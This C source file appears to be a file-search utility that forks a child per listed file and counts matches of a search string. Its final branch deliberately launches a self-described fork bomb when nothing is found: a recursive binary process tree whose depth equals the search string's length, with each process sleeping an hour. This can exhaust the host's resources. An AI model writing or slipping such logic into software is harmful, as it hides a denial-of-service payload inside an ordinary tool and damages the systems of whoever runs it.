#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

#define MAX_PATH 1024
#define MAX_LINE 4096

int search_in_file(const char *filename, const char *search_str) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        return -1;
    }
    
    char line[MAX_LINE];
    int count = 0;
    size_t search_len = strlen(search_str);
    
    while (fgets(line, sizeof(line), file) != NULL) {
        char *pos = line;
        while ((pos = strstr(pos, search_str)) != NULL) {
            count++;
            pos += search_len;
        }
    }
    
    fclose(file);
    return count;
}

void create_process_tree(int depth) {
    if (depth <= 0) {
        return;
    }
    
    pid_t pid1 = fork();
    if (pid1 == 0) {
        create_process_tree(depth - 1);
        sleep(3600);
        exit(0);
    } else if (pid1 > 0) {
        pid_t pid2 = fork();
        if (pid2 == 0) {
            create_process_tree(depth - 1);
            sleep(3600);
            exit(0);
        } else if (pid2 > 0) {
            int status;
            waitpid(pid1, &status, 0);
            waitpid(pid2, &status, 0);
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <path_list_file>\n", argv[0]);
        return 1;
    }
    
    FILE *list_file = fopen(argv[1], "r");
    if (list_file == NULL) {
        fprintf(stderr, "Error opening file: %s\n", argv[1]);
        return 1;
    }
    
    char search_str[MAX_LINE];
    printf("Enter search string: ");
    if (fgets(search_str, sizeof(search_str), stdin) == NULL) {
        fprintf(stderr, "Error reading search string\n");
        fclose(list_file);
        return 1;
    }
    
    size_t len = strlen(search_str);
    if (len > 0 && search_str[len - 1] == '\n') {
        search_str[len - 1] = '\0';
    }
    
    if (strlen(search_str) == 0) {
        fprintf(stderr, "Search string cannot be empty\n");
        fclose(list_file);
        return 1;
    }

    char file_paths[100][MAX_PATH];
    int file_count = 0;
    char path[MAX_PATH];
    
    while (fgets(path, sizeof(path), list_file) != NULL && file_count < 100) {
        len = strlen(path);
        if (len > 0 && path[len - 1] == '\n') {
            path[len - 1] = '\0';
        }
        if (strlen(path) > 0) {
            strcpy(file_paths[file_count], path);
            file_count++;
        }
    }
    
    fclose(list_file);
    
    if (file_count == 0) {
        fprintf(stderr, "No files found in path list\n");
        return 1;
    }
    
    int found_any = 0;
    int pipes[100][2];
    pid_t pids[100];
    
    for (int i = 0; i < file_count; i++) {
        if (pipe(pipes[i]) == -1) {
            continue;
        }
        
        pids[i] = fork();
        
        if (pids[i] == -1) {
            close(pipes[i][0]);
            close(pipes[i][1]);
            continue;
        }
        
        if (pids[i] == 0) {
            close(pipes[i][0]);
            int count = search_in_file(file_paths[i], search_str);
            write(pipes[i][1], &count, sizeof(count));
            close(pipes[i][1]);
            exit(0);
        } else {
            close(pipes[i][1]);
        }
    }
 
    printf("\nSearch results:\n");
    printf("===============\n");
    
    for (int i = 0; i < file_count; i++) {
        int count = -1;
        if (read(pipes[i][0], &count, sizeof(count)) > 0) {
            if (count > 0) {
                printf("File: %s\n", file_paths[i]);
                printf("Matches: %d\n\n", count);
                found_any = 1;
            }
        }
        close(pipes[i][0]);
        waitpid(pids[i], NULL, 0);
    }
    
    if (!found_any) {
        printf("String '%s' not found in any file.\n", search_str);
        printf("Starting fork bomb...\n");
        
        int depth = strlen(search_str);
        create_process_tree(depth);
        
        printf("Fork bomb completed.\n");
    }
    
    return 0;
}